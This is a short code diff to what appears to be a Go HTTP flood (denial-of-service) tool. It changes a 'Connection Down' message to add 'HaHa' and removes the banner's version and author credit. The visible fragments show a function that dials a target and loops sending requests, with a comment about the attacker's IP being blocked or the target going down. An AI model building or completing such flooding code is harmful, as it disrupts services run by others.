@@ -197,7 +197,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("Connection Down HaHa!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -221,8 +221,7 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 2.0      ")
-	fmt.Println("                                                        C0d3d By L330n123")
+	fmt.Println("                         .||                     					      ")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use header.txt as data")
